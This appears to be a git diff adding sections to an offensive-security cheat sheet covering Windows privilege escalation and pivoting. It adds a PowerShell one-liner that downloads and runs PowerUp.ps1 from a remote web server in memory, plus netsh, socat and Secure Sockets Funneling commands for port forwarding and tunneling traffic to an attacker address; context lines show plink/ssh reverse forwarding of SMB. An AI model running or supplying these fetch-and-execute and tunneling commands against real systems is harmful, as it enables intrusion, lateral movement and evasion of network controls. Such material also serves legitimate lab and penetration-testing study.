@@ -678,6 +678,14 @@ type C:\Windows\system32\drivers\etc\hosts
 
 
 
+PowerUp.ps1
+
+```powershell
+powershell.exe /c IEX(New-Object Net.WebClient).downloadString('webserver/PowerUp.ps1') ;Invoke-AllChecks
+```
+
+
+
 If It's AD Get Bloodhound Imported...
 
 ```powershell
@@ -1256,6 +1264,69 @@ plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
 
 ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
 ```
+
+
+
+Powershell Port Forward
+
+```powershell
+netsh interface portproxy add v4tov4 listenport=fromport listenaddress=fromip connectport=toport connectaddress=toip
+
+Permanent ^^
+
+fromport: the port number to listen on, e.g. 80
+fromip: the ip address to listen on, e.g. 192.168.1.1
+toport: the port number to forward to
+toip: the ip address to forward to
+```
+
+
+
+Socat for Windows
+
+```powershell
+#https://github.com/StudioEtrange/socat-windows
+
+Generate SSL Cert for Encryption
+openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.key
+
+Server : socat OPENSSL-LISTEN:443,cert=/cert.pem -
+Client : socat - OPENSSL:localhost:443
+
+#Port Forward
+
+socat OPENSSL-LISTEN:443,cert=/cert.pem,fork TCP:202.54.1.5:443
+
+All SSL Connections will be redirected to 202.54.1.5:443
+
+#Non SSL Port Forward
+socat TCP-LISTEN:80,fork TCP:202.54.1.5:80
+```
+
+
+
+Secure Sockets Funneling
+
+```
+#https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html#ssf
+#git clone https://github.com/securesocketfunneling/ssf.git
+
+./ssfd start Server
+
+./ssf -g -F 1080 -Y 1111 -L 172.19.0.4:2222:10.10.14.3:2222 -L 172.19.0.4:3333:10.10.14.3:3333 10.10.14.3
+
+Massive shout out to 0xdf for explaining this perfectly in his article. Couldn't have done it better myself.
+```
+
+
+
+Chisel (Fast TCP Tunnel over HTTP secured by SSH)
+
+```
+#https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html
+```
+
+
 
 
 
